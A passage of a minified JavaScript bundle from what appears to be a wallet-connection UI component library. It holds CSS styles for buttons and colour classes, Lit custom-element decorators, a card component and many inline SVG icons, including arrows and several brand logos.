      background-color: var(--wui-gray-glass-005);
    }

    button:active:enabled {
      transition: all var(--wui-ease-out-power-2) var(--wui-duration-sm);
      background-color: var(--wui-gray-glass-010);
    }

    button[data-variant='fill']:hover:enabled {
      background-color: var(--wui-color-accent-090);
    }

    button[data-variant='accentBg']:hover:enabled {
      background: var(--wui-accent-glass-015);
    }

    button[data-variant='accentBg']:active:enabled {
      background: var(--wui-accent-glass-020);
    }
  }

  button:disabled {
    cursor: not-allowed;
    background-color: var(--wui-gray-glass-005);
  }

  button[data-variant='shade']:disabled,
  button[data-variant='accent']:disabled,
  button[data-variant='accentBg']:disabled {
    background-color: var(--wui-gray-glass-010);
    color: var(--wui-gray-glass-015);
    filter: grayscale(1);
  }

  button:disabled > wui-wallet-image,
  button:disabled > wui-all-wallets-image,
  button:disabled > wui-network-image,
  button:disabled > wui-image,
  button:disabled > wui-icon-box,
  button:disabled > wui-transaction-visual,
  button:disabled > wui-logo {
    filter: grayscale(1);
  }

  button:focus-visible,
  a:focus-visible {
    border: 1px solid var(--wui-color-accent-100);
    background-color: var(--wui-gray-glass-005);
    -webkit-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    -moz-box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
    box-shadow: 0px 0px 0px 4px var(--wui-box-shadow-blue);
  }

  button[data-variant='fill']:focus-visible {
    background-color: var(--wui-color-accent-090);
  }

  button[data-variant='fill'] {
    color: var(--wui-color-inverse-100);
    background-color: var(--wui-color-accent-100);
  }

  button[data-variant='fill']:disabled {
    color: var(--wui-gray-glass-015);
    background-color: var(--wui-gray-glass-015);
  }

  button[data-variant='fill']:disabled > wui-icon {
    color: var(--wui-gray-glass-015);
  }

  button[data-variant='shade'] {
    color: var(--wui-color-fg-200);
  }

  button[data-variant='accent'],
  button[data-variant='accentBg'] {
    color: var(--wui-color-accent-100);
  }

  button[data-variant='accentBg'] {
    background: var(--wui-accent-glass-010);
    border: 1px solid var(--wui-accent-glass-010);
  }

  button[data-variant='fullWidth'] {
    width: 100%;
    border-radius: var(--wui-border-radius-xs);
    height: 56px;
    border: none;
    background-color: var(--wui-gray-glass-002);
    color: var(--wui-color-fg-200);
    gap: var(--wui-spacing-xs);
  }

  button:active:enabled {
    background-color: var(--wui-gray-glass-010);
  }

  button[data-variant='fill']:active:enabled {
    background-color: var(--wui-color-accent-080);
    border: 1px solid var(--wui-gray-glass-010);
  }

  input {
    border: none;
    outline: none;
    appearance: none;
  }
`,S3=Qe`
  .wui-color-inherit {
    color: var(--wui-color-inherit);
  }

  .wui-color-accent-100 {
    color: var(--wui-color-accent-100);
  }

  .wui-color-error-100 {
    color: var(--wui-color-error-100);
  }

  .wui-color-success-100 {
    color: var(--wui-color-success-100);
  }

  .wui-color-inverse-100 {
    color: var(--wui-color-inverse-100);
  }

  .wui-color-inverse-000 {
    color: var(--wui-color-inverse-000);
  }

  .wui-color-fg-100 {
    color: var(--wui-color-fg-100);
  }

  .wui-color-fg-200 {
    color: var(--wui-color-fg-200);
  }

  .wui-color-fg-300 {
    color: var(--wui-color-fg-300);
  }

  .wui-bg-color-inherit {
    background-color: var(--wui-color-inherit);
  }

  .wui-bg-color-blue-100 {
    background-color: var(--wui-color-accent-100);
  }

  .wui-bg-color-error-100 {
    background-color: var(--wui-color-error-100);
  }

  .wui-bg-color-success-100 {
    background-color: var(--wui-color-success-100);
  }

  .wui-bg-color-inverse-100 {
    background-color: var(--wui-color-inverse-100);
  }

  .wui-bg-color-inverse-000 {
    background-color: var(--wui-color-inverse-000);
  }

  .wui-bg-color-fg-100 {
    background-color: var(--wui-color-fg-100);
  }

  .wui-bg-color-fg-200 {
    background-color: var(--wui-color-fg-200);
  }

  .wui-bg-color-fg-300 {
    background-color: var(--wui-color-fg-300);
  }
`;function VB(e,t){const{kind:r,elements:n}=t;return{kind:r,elements:n,finisher(t){customElements.get(e)||customElements.define(e,t)}}}function GB(e,t){return customElements.get(e)||customElements.define(e,t),t}function De(e){return function(t){return"function"==typeof t?GB(e,t):VB(e,t)}}const KB=Qe`
  :host {
    display: block;
    border-radius: clamp(0px, var(--wui-border-radius-l), 44px);
    border: 1px solid var(--wui-gray-glass-005);
    background-color: var(--wui-color-modal-bg);
    overflow: hidden;
  }
`;var JB=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Xy=class extends $e{render(){return pe`<slot></slot>`}};Xy.styles=[Rt,KB],Xy=JB([De("wui-card")],Xy);
/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */
const ZB={attribute:!0,type:String,converter:dg,reflect:!1,hasChanged:E3},QB=(e=ZB,t,r)=>{const{kind:n,metadata:i}=r;let o=globalThis.litPropertyMetadata.get(i);if(void 0===o&&globalThis.litPropertyMetadata.set(i,o=new Map),o.set(r.name,e),"accessor"===n){const{name:n}=r;return{set(r){const i=t.get.call(this);t.set.call(this,r),this.requestUpdate(n,i,e)},init(t){return void 0!==t&&this.C(n,void 0,e),t}}}if("setter"===n){const{name:n}=r;return function(r){const i=this[n];t.call(this,r),this.requestUpdate(n,i,e)}}throw Error("Unsupported decorator location: "+n)};function ve(e){return(t,r)=>"object"==typeof r?QB(e,t,r):((e,t,r)=>{const n=t.hasOwnProperty(r);return t.constructor.createProperty(r,n?{...e,wrapped:!0}:e),n?Object.getOwnPropertyDescriptor(t,r):void 0})(e,t,r)
/**
 * @license
 * Copyright 2017 Google LLC
 * SPDX-License-Identifier: BSD-3-Clause
 */}function xt(e){return ve({...e,state:!0,attribute:!1})}const YB=Qe`
  :host {
    display: flex;
    aspect-ratio: 1 / 1;
    color: var(--local-color);
    width: var(--local-width);
  }

  svg {
    width: inherit;
    height: inherit;
    object-fit: contain;
    object-position: center;
  }
`,XB=ze`<svg fill="none" viewBox="0 0 24 24">
  <path
    style="fill: var(--wui-color-accent-100);"
    d="M10.2 6.6a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM21 6.6a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM10.2 17.4a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0ZM21 17.4a3.6 3.6 0 1 1-7.2 0 3.6 3.6 0 0 1 7.2 0Z"
  />
</svg>`,eF=ze`
<svg width="36" height="36">
  <path
    d="M28.724 0H7.271A7.269 7.269 0 0 0 0 7.272v21.46A7.268 7.268 0 0 0 7.271 36H28.73A7.272 7.272 0 0 0 36 28.728V7.272A7.275 7.275 0 0 0 28.724 0Z"
    fill="url(#a)"
  />
  <path
    d="m17.845 8.271.729-1.26a1.64 1.64 0 1 1 2.843 1.638l-7.023 12.159h5.08c1.646 0 2.569 1.935 1.853 3.276H6.434a1.632 1.632 0 0 1-1.638-1.638c0-.909.73-1.638 1.638-1.638h4.176l5.345-9.265-1.67-2.898a1.642 1.642 0 0 1 2.844-1.638l.716 1.264Zm-6.317 17.5-1.575 2.732a1.64 1.64 0 1 1-2.844-1.638l1.17-2.025c1.323-.41 2.398-.095 3.249.931Zm13.56-4.954h4.262c.909 0 1.638.729 1.638 1.638 0 .909-.73 1.638-1.638 1.638h-2.367l1.597 2.772c.45.788.185 1.782-.602 2.241a1.642 1.642 0 0 1-2.241-.603c-2.69-4.666-4.711-8.159-6.052-10.485-1.372-2.367-.391-4.743.576-5.549 1.075 1.846 2.682 4.631 4.828 8.348Z"
    fill="#fff"
  />
  <defs>
    <linearGradient id="a" x1="18" y1="0" x2="18" y2="36" gradientUnits="userSpaceOnUse">
      <stop stop-color="#18BFFB" />
      <stop offset="1" stop-color="#2072F3" />
    </linearGradient>
  </defs>
</svg>`,tF=ze`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#000" />
      <g clip-path="url(#c)">
        <path
          fill="#fff"
          d="M28.77 23.3c-.69 1.99-2.75 5.52-4.87 5.56-1.4.03-1.86-.84-3.46-.84-1.61 0-2.12.81-3.45.86-2.25.1-5.72-5.1-5.72-9.62 0-4.15 2.9-6.2 5.42-6.25 1.36-.02 2.64.92 3.47.92.83 0 2.38-1.13 4.02-.97.68.03 2.6.28 3.84 2.08-3.27 2.14-2.76 6.61.75 8.25ZM24.2 7.88c-2.47.1-4.49 2.69-4.2 4.84 2.28.17 4.47-2.39 4.2-4.84Z"
        />
      </g>
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
    <clipPath id="c"><path fill="#fff" d="M8 7.89h24v24H8z" /></clipPath>
  </defs>
</svg>`,rF=ze`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 1.99a1 1 0 0 1 1 1v7.58l2.46-2.46a1 1 0 0 1 1.41 1.42L7.7 13.69a1 1 0 0 1-1.41 0L2.12 9.53A1 1 0 0 1 3.54 8.1L6 10.57V3a1 1 0 0 1 1-1Z"
    clip-rule="evenodd"
  />
</svg>`,nF=ze`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M13 7.99a1 1 0 0 1-1 1H4.4l2.46 2.46a1 1 0 1 1-1.41 1.41L1.29 8.7a1 1 0 0 1 0-1.41L5.46 3.1a1 1 0 0 1 1.41 1.42L4.41 6.99H12a1 1 0 0 1 1 1Z"
    clip-rule="evenodd"
  />
</svg>`,iF=ze`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M1 7.99a1 1 0 0 1 1-1h7.58L7.12 4.53A1 1 0 1 1 8.54 3.1l4.16 4.17a1 1 0 0 1 0 1.41l-4.16 4.17a1 1 0 1 1-1.42-1.41l2.46-2.46H2a1 1 0 0 1-1-1Z"
    clip-rule="evenodd"
  />
</svg>`,sF=ze`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 13.99a1 1 0 0 1-1-1V5.4L3.54 7.86a1 1 0 0 1-1.42-1.41L6.3 2.28a1 1 0 0 1 1.41 0l4.17 4.17a1 1 0 1 1-1.41 1.41L8 5.4v7.59a1 1 0 0 1-1 1Z"
    clip-rule="evenodd"
  />
</svg>`,oF=ze`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4 6.4a1 1 0 0 1-.46.89 6.98 6.98 0 0 0 .38 6.18A7 7 0 0 0 16.46 7.3a1 1 0 0 1-.47-.92 7 7 0 0 0-12 .03Zm-2.02-.5a9 9 0 1 1 16.03 8.2A9 9 0 0 1 1.98 5.9Z"
    clip-rule="evenodd"
  />
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.03 8.63c-1.46-.3-2.72-.75-3.6-1.35l-.02-.01-.14-.11a1 1 0 0 1 1.2-1.6l.1.08c.6.4 1.52.74 2.69 1 .16-.99.39-1.88.67-2.65.3-.79.68-1.5 1.15-2.02A2.58 2.58 0 0 1 9.99 1c.8 0 1.45.44 1.92.97.47.52.84 1.23 1.14 2.02.29.77.52 1.66.68 2.64a8 8 0 0 0 2.7-1l.26-.18h.48a1 1 0 0 1 .12 2c-.86.51-2.01.91-3.34 1.18a22.24 22.24 0 0 1-.03 3.19c1.45.29 2.7.73 3.58 1.31a1 1 0 0 1-1.1 1.68c-.6-.4-1.56-.76-2.75-1-.15.8-.36 1.55-.6 2.2-.3.79-.67 1.5-1.14 2.02-.47.53-1.12.97-1.92.97-.8 0-1.45-.44-1.91-.97a6.51 6.51 0 0 1-1.15-2.02c-.24-.65-.44-1.4-.6-2.2-1.18.24-2.13.6-2.73.99a1 1 0 1 1-1.1-1.67c.88-.58 2.12-1.03 3.57-1.31a22.03 22.03 0 0 1-.04-3.2Zm2.2-1.7c.15-.86.34-1.61.58-2.24.24-.65.51-1.12.76-1.4.25-.28.4-.29.42-.29.03 0 .17.01.42.3.25.27.52.74.77 1.4.23.62.43 1.37.57 2.22a19.96 19.96 0 0 1-3.52 0Zm-.18 4.6a20.1 20.1 0 0 1-.03-2.62 21.95 21.95 0 0 0 3.94 0 20.4 20.4 0 0 1-.03 2.63 21.97 21.97 0 0 0-3.88 0Zm.27 2c.13.66.3 1.26.49 1.78.24.65.51 1.12.76 1.4.25.28.4.29.42.29.03 0 .17-.01.42-.3.25-.27.52-.74.77-1.4.19-.5.36-1.1.49-1.78a20.03 20.03 0 0 0-3.35 0Z"
    clip-rule="evenodd"
  />
</svg>`,aF=ze`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M12.04 2.65c.47.3.6.91.3 1.38l-5.78 9a1 1 0 0 1-1.61.1L1.73 9.27A1 1 0 1 1 3.27 8L5.6 10.8l5.05-7.85a1 1 0 0 1 1.38-.3Z"
    clip-rule="evenodd"
  />
</svg>`,cF=ze`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M1.46 4.96a1 1 0 0 1 1.41 0L8 10.09l5.13-5.13a1 1 0 1 1 1.41 1.41l-5.83 5.84a1 1 0 0 1-1.42 0L1.46 6.37a1 1 0 0 1 0-1.41Z"
    clip-rule="evenodd"
  />
</svg>`,lF=ze`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M11.04 1.46a1 1 0 0 1 0 1.41L5.91 8l5.13 5.13a1 1 0 1 1-1.41 1.41L3.79 8.71a1 1 0 0 1 0-1.42l5.84-5.83a1 1 0 0 1 1.41 0Z"
    clip-rule="evenodd"
  />
</svg>`,uF=ze`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M4.96 14.54a1 1 0 0 1 0-1.41L10.09 8 4.96 2.87a1 1 0 0 1 1.41-1.41l5.84 5.83a1 1 0 0 1 0 1.42l-5.84 5.83a1 1 0 0 1-1.41 0Z"
    clip-rule="evenodd"
  />
</svg>`,fF=ze`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M14.54 11.04a1 1 0 0 1-1.41 0L8 5.92l-5.13 5.12a1 1 0 1 1-1.41-1.41l5.83-5.84a1 1 0 0 1 1.42 0l5.83 5.84a1 1 0 0 1 0 1.41Z"
    clip-rule="evenodd"
  />
</svg>`,hF=ze`<svg width="36" height="36" fill="none">
  <path
    fill="#fff"
    fill-opacity=".05"
    d="M0 14.94c0-5.55 0-8.326 1.182-10.4a9 9 0 0 1 3.359-3.358C6.614 0 9.389 0 14.94 0h6.12c5.55 0 8.326 0 10.4 1.182a9 9 0 0 1 3.358 3.359C36 6.614 36 9.389 36 14.94v6.12c0 5.55 0 8.326-1.182 10.4a9 9 0 0 1-3.359 3.358C29.386 36 26.611 36 21.06 36h-6.12c-5.55 0-8.326 0-10.4-1.182a9 9 0 0 1-3.358-3.359C0 29.386 0 26.611 0 21.06v-6.12Z"
  />
  <path
    stroke="#fff"
    stroke-opacity=".05"
    d="M14.94.5h6.12c2.785 0 4.84 0 6.46.146 1.612.144 2.743.43 3.691.97a8.5 8.5 0 0 1 3.172 3.173c.541.948.826 2.08.971 3.692.145 1.62.146 3.675.146 6.459v6.12c0 2.785 0 4.84-.146 6.46-.145 1.612-.43 2.743-.97 3.691a8.5 8.5 0 0 1-3.173 3.172c-.948.541-2.08.826-3.692.971-1.62.145-3.674.146-6.459.146h-6.12c-2.784 0-4.84 0-6.46-.146-1.612-.145-2.743-.43-3.691-.97a8.5 8.5 0 0 1-3.172-3.173c-.541-.948-.827-2.08-.971-3.692C.5 25.9.5 23.845.5 21.06v-6.12c0-2.784 0-4.84.146-6.46.144-1.612.43-2.743.97-3.691A8.5 8.5 0 0 1 4.79 1.617C5.737 1.076 6.869.79 8.48.646 10.1.5 12.156.5 14.94.5Z"
  />
  <path
    fill="url(#a)"
    d="M17.998 10.8h12.469a14.397 14.397 0 0 0-24.938.001l6.234 10.798.006-.001a7.19 7.19 0 0 1 6.23-10.799Z"
  />
  <path
    fill="url(#b)"
    d="m24.237 21.598-6.234 10.798A14.397 14.397 0 0 0 30.47 10.798H18.002l-.002.006a7.191 7.191 0 0 1 6.237 10.794Z"
  />
  <path
    fill="url(#c)"
    d="M11.765 21.601 5.531 10.803A14.396 14.396 0 0 0 18.001 32.4l6.235-10.798-.004-.004a7.19 7.19 0 0 1-12.466.004Z"
  />
  <path fill="#fff" d="M18 25.2a7.2 7.2 0 1 0 0-14.4 7.2 7.2 0 0 0 0 14.4Z" />
  <path fill="#1A73E8" d="M18 23.7a5.7 5.7 0 1 0 0-11.4 5.7 5.7 0 0 0 0 11.4Z" />
  <defs>
    <linearGradient
      id="a"
      x1="6.294"
      x2="41.1"
      y1="5.995"
      y2="5.995"
      gradientUnits="userSpaceOnUse"
    >
      <stop stop-color="#D93025" />
      <stop offset="1" stop-color="#EA4335" />
    </linearGradient>
    <linearGradient
      id="b"
      x1="20.953"
      x2="37.194"
      y1="32.143"
      y2="2.701"
      gradientUnits="userSpaceOnUse"
    >
      <stop stop-color="#FCC934" />
      <stop offset="1" stop-color="#FBBC04" />
    </linearGradient>
    <linearGradient
      id="c"
      x1="25.873"
      x2="9.632"
      y1="31.2"
      y2="1.759"
      gradientUnits="userSpaceOnUse"
    >
      <stop stop-color="#1E8E3E" />
      <stop offset="1" stop-color="#34A853" />
    </linearGradient>
  </defs>
</svg>`,dF=ze`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M7 2.99a5 5 0 1 0 0 10 5 5 0 0 0 0-10Zm-7 5a7 7 0 1 1 14 0 7 7 0 0 1-14 0Zm7-4a1 1 0 0 1 1 1v2.58l1.85 1.85a1 1 0 0 1-1.41 1.42L6.29 8.69A1 1 0 0 1 6 8v-3a1 1 0 0 1 1-1Z"
    clip-rule="evenodd"
  />
</svg>`,pF=ze`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M2.54 2.54a1 1 0 0 1 1.42 0L8 6.6l4.04-4.05a1 1 0 1 1 1.42 1.42L9.4 8l4.05 4.04a1 1 0 0 1-1.42 1.42L8 9.4l-4.04 4.05a1 1 0 0 1-1.42-1.42L6.6 8 2.54 3.96a1 1 0 0 1 0-1.42Z"
    clip-rule="evenodd"
  />
</svg>`,gF=ze`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M10 3a7 7 0 0 0-6.85 8.44l8.29-8.3C10.97 3.06 10.49 3 10 3Zm3.49.93-9.56 9.56c.32.55.71 1.06 1.16 1.5L15 5.1a7.03 7.03 0 0 0-1.5-1.16Zm2.7 2.8-9.46 9.46a7 7 0 0 0 9.46-9.46ZM1.99 5.9A9 9 0 1 1 18 14.09 9 9 0 0 1 1.98 5.91Z"
    clip-rule="evenodd"
  />
</svg>`,vF=ze`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M8 2a6 6 0 1 0 0 12A6 6 0 0 0 8 2ZM0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm10.66-2.65a1 1 0 0 1 .23 1.06L9.83 9.24a1 1 0 0 1-.59.58l-2.83 1.06A1 1 0 0 1 5.13 9.6l1.06-2.82a1 1 0 0 1 .58-.59L9.6 5.12a1 1 0 0 1 1.06.23ZM7.9 7.89l-.13.35.35-.13.12-.35-.34.13Z"
    clip-rule="evenodd"
  />
</svg>`,mF=ze`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M9.5 0h1.67c.68 0 1.26 0 1.73.04.5.05.97.14 1.42.4.52.3.95.72 1.24 1.24.26.45.35.92.4 1.42.04.47.04 1.05.04 1.73V6.5c0 .69 0 1.26-.04 1.74-.05.5-.14.97-.4 1.41-.3.52-.72.95-1.24 1.25-.45.25-.92.35-1.42.4-.43.03-.95.03-1.57.03 0 .62 0 1.14-.04 1.57-.04.5-.14.97-.4 1.42-.29.52-.72.95-1.24 1.24-.44.26-.92.35-1.41.4-.48.04-1.05.04-1.74.04H4.83c-.68 0-1.26 0-1.73-.04-.5-.05-.97-.14-1.42-.4-.52-.3-.95-.72-1.24-1.24a3.39 3.39 0 0 1-.4-1.42A20.9 20.9 0 0 1 0 11.17V9.5c0-.69 0-1.26.04-1.74.05-.5.14-.97.4-1.41.3-.52.72-.95 1.24-1.25.45-.25.92-.35 1.42-.4.43-.03.95-.03 1.57-.03 0-.62 0-1.14.04-1.57.04-.5.14-.97.4-1.42.29-.52.72-.95 1.24-1.24.44-.26.92-.35 1.41-.4A20.9 20.9 0 0 1 9.5 0ZM4.67 6.67c-.63 0-1.06 0-1.4.03-.35.03-.5.09-.6.14-.2.12-.38.3-.5.5-.05.1-.1.24-.14.6C2 8.32 2 8.8 2 9.54v1.59c0 .73 0 1.22.03 1.6.04.35.1.5.15.6.11.2.29.38.5.5.09.05.24.1.6.14.37.03.86.03 1.6.03h1.58c.74 0 1.22 0 1.6-.03.36-.04.5-.1.6-.15.2-.11.38-.29.5-.5.05-.09.1-.24.14-.6.03-.33.03-.76.03-1.39-.6 0-1.13 0-1.57-.04-.5-.04-.97-.14-1.41-.4-.52-.29-.95-.72-1.25-1.24a3.39 3.39 0 0 1-.4-1.41c-.03-.44-.03-.96-.03-1.57Zm3.27-4.64c-.36.04-.5.1-.6.15-.2.11-.38.29-.5.5-.05.09-.1.24-.14.6-.03.37-.03.86-.03 1.6v1.58c0 .74 0 1.22.03 1.6.03.36.09.5.14.6.12.2.3.38.5.5.1.05.24.1.6.14.38.03.86.03 1.6.03h1.59c.73 0 1.22 0 1.6-.03.35-.03.5-.09.6-.14.2-.12.38-.3.5-.5.05-.1.1-.24.14-.6.03-.38.03-.86.03-1.6V4.87c0-.73 0-1.22-.03-1.6a1.46 1.46 0 0 0-.15-.6c-.11-.2-.29-.38-.5-.5-.09-.05-.24-.1-.6-.14-.37-.03-.86-.03-1.6-.03H9.55c-.74 0-1.22 0-1.6.03Z"
    clip-rule="evenodd"
  />
</svg>`,bF=ze` <svg fill="none" viewBox="0 0 13 4">
  <path fill="currentColor" d="M.5 0h12L8.9 3.13a3.76 3.76 0 0 1-4.8 0L.5 0Z" />
</svg>`,wF=ze`<svg fill="none" viewBox="0 0 20 20">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M13.66 2H6.34c-1.07 0-1.96 0-2.68.08-.74.08-1.42.25-2.01.68a4 4 0 0 0-.89.89c-.43.6-.6 1.27-.68 2.01C0 6.38 0 7.26 0 8.34v.89c0 1.07 0 1.96.08 2.68.08.74.25 1.42.68 2.01a4 4 0 0 0 .89.89c.6.43 1.27.6 2.01.68a27 27 0 0 0 2.68.08h7.32a27 27 0 0 0 2.68-.08 4.03 4.03 0 0 0 2.01-.68 4 4 0 0 0 .89-.89c.43-.6.6-1.27.68-2.01.08-.72.08-1.6.08-2.68v-.89c0-1.07 0-1.96-.08-2.68a4.04 4.04 0 0 0-.68-2.01 4 4 0 0 0-.89-.89c-.6-.43-1.27-.6-2.01-.68C15.62 2 14.74 2 13.66 2ZM2.82 4.38c.2-.14.48-.25 1.06-.31C4.48 4 5.25 4 6.4 4h7.2c1.15 0 1.93 0 2.52.07.58.06.86.17 1.06.31a2 2 0 0 1 .44.44c.14.2.25.48.31 1.06.07.6.07 1.37.07 2.52v.77c0 1.15 0 1.93-.07 2.52-.06.58-.17.86-.31 1.06a2 2 0 0 1-.44.44c-.2.14-.48.25-1.06.32-.6.06-1.37.06-2.52.06H6.4c-1.15 0-1.93 0-2.52-.06-.58-.07-.86-.18-1.06-.32a2 2 0 0 1-.44-.44c-.14-.2-.25-.48-.31-1.06C2 11.1 2 10.32 2 9.17V8.4c0-1.15 0-1.93.07-2.52.06-.58.17-.86.31-1.06a2 2 0 0 1 .44-.44Z"
    clip-rule="evenodd"
  />
  <path fill="currentColor" d="M6.14 17.57a1 1 0 1 0 0 2h7.72a1 1 0 1 0 0-2H6.14Z" />
</svg>`,yF=ze`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.07 1h.57a1 1 0 0 1 0 2h-.52c-.98 0-1.64 0-2.14.06-.48.05-.7.14-.84.24-.13.1-.25.22-.34.35-.1.14-.2.35-.25.83-.05.5-.05 1.16-.05 2.15v2.74c0 .99 0 1.65.05 2.15.05.48.14.7.25.83.1.14.2.25.34.35.14.1.36.2.84.25.5.05 1.16.05 2.14.05h.52a1 1 0 0 1 0 2h-.57c-.92 0-1.69 0-2.3-.07a3.6 3.6 0 0 1-1.8-.61c-.3-.22-.57-.49-.8-.8a3.6 3.6 0 0 1-.6-1.79C.5 11.11.5 10.35.5 9.43V6.58c0-.92 0-1.7.06-2.31a3.6 3.6 0 0 1 .62-1.8c.22-.3.48-.57.79-.79a3.6 3.6 0 0 1 1.8-.61C4.37 1 5.14 1 6.06 1ZM9.5 3a1 1 0 0 1 1.42 0l4.28 4.3a1 1 0 0 1 0 1.4L10.93 13a1 1 0 0 1-1.42-1.42L12.1 9H6.8a1 1 0 1 1 0-2h5.3L9.51 4.42a1 1 0 0 1 0-1.41Z"
    clip-rule="evenodd"
  />
</svg>`,_F=ze`<svg fill="none" viewBox="0 0 40 40">
  <g clip-path="url(#a)">
    <g clip-path="url(#b)">
      <circle cx="20" cy="19.89" r="20" fill="#5865F2" />
      <path
        fill="#fff"
        fill-rule="evenodd"
        d="M25.71 28.15C30.25 28 32 25.02 32 25.02c0-6.61-2.96-11.98-2.96-11.98-2.96-2.22-5.77-2.15-5.77-2.15l-.29.32c3.5 1.07 5.12 2.61 5.12 2.61a16.75 16.75 0 0 0-10.34-1.93l-.35.04a15.43 15.43 0 0 0-5.88 1.9s1.71-1.63 5.4-2.7l-.2-.24s-2.81-.07-5.77 2.15c0 0-2.96 5.37-2.96 11.98 0 0 1.73 2.98 6.27 3.13l1.37-1.7c-2.6-.79-3.6-2.43-3.6-2.43l.58.35.09.06.08.04.02.01.08.05a17.25 17.25 0 0 0 4.52 1.58 14.4 14.4 0 0 0 8.3-.86c.72-.27 1.52-.66 2.37-1.21 0 0-1.03 1.68-3.72 2.44.61.78 1.35 1.67 1.35 1.67Zm-9.55-9.6c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28.01-1.25-.93-2.28-2.1-2.28Zm7.5 0c-1.17 0-2.1 1.03-2.1 2.28 0 1.25.95 2.28 2.1 2.28 1.17 0 2.1-1.03 2.1-2.28 0-1.25-.93-2.28-2.1-2.28Z"
        clip-rule="evenodd"
      />
    </g>
  </g>
  <defs>
    <clipPath id="a"><rect width="40" height="40" fill="#fff" rx="20" /></clipPath>
    <clipPath id="b"><path fill="#fff" d="M0 0h40v40H0z" /></clipPath>
  </defs>
</svg>`,EF=ze`<svg fill="none" viewBox="0 0 16 16">
  <path
    fill="currentColor"
    d="M4.25 7a.63.63 0 0 0-.63.63v3.97c0 .28-.2.51-.47.54l-.75.07a.93.93 0 0 1-.9-.47A7.51 7.51 0 0 1 5.54.92a7.5 7.5 0 0 1 9.54 4.62c.12.35.06.72-.16 1-.74.97-1.68 1.78-2.6 2.44V4.44a.64.64 0 0 0-.63-.64h-1.06c-.35 0-.63.3-.63.64v5.5c0 .23-.12.42-.32.5l-.52.23V6.05c0-.36-.3-.64-.64-.64H7.45c-.35 0-.64.3-.64.64v4.97c0 .25-.17.46-.4.52a5.8 5.8 0 0 0-.45.11v-4c0-.36-.3-.65-.64-.65H4.25ZM14.07 12.4A7.49 7.49 0 0 1 3.6 14.08c4.09-.58 9.14-2.5 11.87-6.6v.03a7.56 7.56 0 0 1-1.41 4.91Z"
  />
</svg>`,xF=ze`<svg fill="none" viewBox="0 0 14 15">
  <path
    fill="currentColor"
    fill-rule="evenodd"
    d="M6.71 2.99a.57.57 0 0 0-.57.57 1 1 0 0 1-1 1c-.58 0-.96 0-1.24.03-.27.03-.37.07-.42.1a.97.97 0 0 0-.36.35c-.04.08-.09.21-.11.67a2.57 2.57 0 0 1 0 5.13c.02.45.07.6.11.66.09.15.21.28.36.36.07.04.21.1.67.12a2.57 2.57 0 0 1 5.12 0c.46-.03.6-.08.67-.12a.97.97 0 0 0 .36-.36c.03-.04.07-.14.1-.41.02-.29.03-.66.03-1.24a1 1 0 0 1 1-1 .57.57 0 0 0 0-1.15 1 1 0 0 1-1-1c0-.58 0-.95-.03-1.24a1.04 1.04 0 0 0-.1-.42.97.97 0 0 0-.36-.36 1.04 1.04 0 0 0-.42-.1c-.28-.02-.65-.02-1.24-.02a1 1 0 0 1-1-1 .57.57 0 0 0-.57-.57ZM5.15 13.98a1 1 0 0 0 .99-1v-.78a.57.57 0 0 1 1.14 0v.78a1 1 0 0 0 .99 1H8.36a66.26 66.26 0 0 0 .73 0 3.78 3.78 0 0 0 1.84-.38c.46-.26.85-.64 1.1-1.1.23-.4.32-.8.36-1.22.02-.2.03-.4.03-.63a2.57 2.57 0 0 0 0-4.75c0-.23-.01-.44-.03-.63a2.96 2.96 0 0 0-.35-1.22 2.97 2.97 0 0 